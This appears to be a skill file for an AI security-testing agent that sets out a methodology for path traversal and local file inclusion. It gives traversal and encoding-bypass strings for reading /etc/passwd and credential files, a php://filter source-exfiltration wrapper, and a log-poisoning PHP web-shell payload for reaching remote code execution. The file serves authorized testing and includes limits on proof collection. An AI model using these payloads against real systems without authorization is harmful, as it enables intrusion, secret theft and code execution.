---
name: path-traversal-lfi
description: "Path traversal and local file inclusion methodology: read arbitrary files, bypass path filters/encoding, and escalate LFI to RCE via wrappers, log poisoning, and session files. Auto-loads on file/download/template/include/path parameters, or when path-traversal-hunter is engaged."
---

# Path Traversal / LFI

Reading arbitrary files is High on its own; escalating LFI→RCE makes it Critical. Deep work goes to `path-traversal-hunter`. Payloads live in the burp-scan steering. Pairs with safe-exploitation (read one benign proof file, don't hoard secrets), business-impact.

---

## 1. FIND FILE-PATH SINKS
`file=`, `path=`, `page=`, `template=`, `include=`, `download=`, `doc=`, `img=`, `lang=`, `theme=`, attachment/report/export endpoints, PDF/image loaders, ZIP/archive extraction (Zip-Slip), and anything that maps input to a filename.

## 2. TRAVERSE + PROVE READ
- Linux proof target: `../../../../etc/passwd` → look for `root:x:0:0:`. Also `/etc/hostname`, `/proc/self/environ`, `/proc/self/cmdline`.
- Windows: `..\..\..\windows\win.ini` → `[fonts]`; `C:\Windows\System32\drivers\etc\hosts`.
- Absolute path (when no traversal needed): `/etc/passwd`, `file:///etc/passwd`.
- Confirm it's a real file read (full expected content), not a page that merely contains the word "passwd" (evidence-discipline).

## 3. BYPASS FILTERS
- Encoding: `..%2f`, `..%252f` (double), `%2e%2e%2f`, overlong UTF-8, `..%c0%af`.
- Filter that strips `../` once: `....//`, `..../\`, nested `....//....//`.
- Required prefix/suffix: `/var/www/{input}` → traverse up; enforced extension → `%00` (legacy), or path/param truncation, or `....//...passwd%00.png`.
- Base-dir allow-list: absolute path or `....` variants; on some stacks a leading `/` resets.

## 4. ESCALATE LFI → RCE (PHP especially)
- **php:// wrappers:** `php://filter/convert.base64-encode/resource=index.php` to exfil source (find secrets/other bugs); `php://filter` chains (`convert.iconv`) can even reach RCE on modern PHP; `data://`/`expect://` if enabled.
- **Log poisoning:** inject PHP into a log the app then includes (`User-Agent: <?php system($_GET[c]);?>` → include `/var/log/apache2/access.log`).
- **Session/upload include:** poison `/tmp/sess_<id>` or an uploaded file, then include it.
- **/proc/self/environ**, PHP wrappers on `phpinfo`, or `pearcmd.php` tricks.
Prove RCE the safe way (`id`, one command) then stop (safe-exploitation, command-injection-rce).

## 5. IMPACT + EVIDENCE
- Impact (business-impact): source/secret disclosure = High; LFI→RCE = Critical; reading config/`.env`/private keys = High (redact and prove validity minimally, secrets-triage).
- Capture: exact request, the file content proof (e.g. the `root:x:0:0` line, or base64 source header), and the escalation proof if achieved. Read ONE proof file; do not exfiltrate real user data.

## FALSE POSITIVES
- Response "contains root" but not the full `passwd` format (custom 404/error page).
- The app returns the same file regardless of traversal (static template) — no real inclusion.
- Download endpoint that correctly canonicalizes/allow-lists — note as hardened.
